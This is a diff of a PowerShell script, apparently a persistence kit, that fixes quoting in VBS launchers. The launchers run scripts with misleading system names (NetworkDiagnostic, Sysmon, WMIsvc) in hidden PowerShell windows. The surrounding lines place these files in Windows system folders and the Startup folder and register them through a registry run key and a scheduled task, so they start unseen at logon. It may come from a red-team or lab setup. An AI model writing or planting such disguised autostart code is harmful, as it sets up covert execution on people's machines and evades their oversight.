@@ -13,7 +13,7 @@ if ((Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper).Wall
 
 if (-not (Test-Path "C:\Windows\Help\NetworkDiagnostic.vbs")){
     New-Item -ItemType File -Path "C:\Windows\Help\NetworkDiagnostic.vbs"
-    Set-Content -Path "C:\Windows\Help\NetworkDiagnostic.vbs" -Value "CreateObject(\"WScript.Shell\").Run \"powershell.exe -WindowStyle Hidden -File C:\Windows\Help\NetworkDiagnostic.ps1\", 0, False"
+    Set-Content -Path "C:\Windows\Help\NetworkDiagnostic.vbs" -Value "CreateObject('WScript.Shell').Run 'powershell.exe -WindowStyle Hidden -File C:\Windows\Help\NetworkDiagnostic.ps1', 0, False"
 }
 
 # Create Registry Key to start NetDiag on startup
@@ -34,7 +34,7 @@ if (-not (Test-Path "C:\Windows\Logs\Sysmon.ps1")){
 
 if (-not (Test-Path "C:\Windows\Logs\Sysmon.vbs")){
     New-Item -ItemType File -Path "C:\Windows\Logs\Sysmon.vbs"
-    Set-Content -Path "C:\Windows\Logs\Sysmon.vbs" -Value "CreateObject(\"WScript.Shell\").Run \"powershell.exe -WindowStyle Hidden -File C:\Windows\Logs\Sysmon.ps1\", 0, False"
+    Set-Content -Path "C:\Windows\Logs\Sysmon.vbs" -Value "CreateObject('WScript.Shell').Run 'powershell.exe -WindowStyle Hidden -File C:\Windows\Logs\Sysmon.ps1', 0, False"
 }
 
 # Create scheduled task to run sysmon.ps1
@@ -53,5 +53,5 @@ if (-not (Test-Path "C:\Windows\System32\zh-cn\WMIsvc.ps1")){
 
 if (-not (Test-Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.vbs")){
     New-Item -ItemType File -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.vbs"
-    Set-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.vbs" -Value "CreateObject(\"WScript.Shell\").Run \"powershell.exe -WindowStyle Hidden -File C:\Windows\System32\zh-cn\WMIsvc.ps1\", 0, False"
+    Set-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.vbs" -Value "CreateObject('WScript.Shell').Run 'powershell.exe -WindowStyle Hidden -File C:\Windows\System32\zh-cn\WMIsvc.ps1', 0, False"
 }
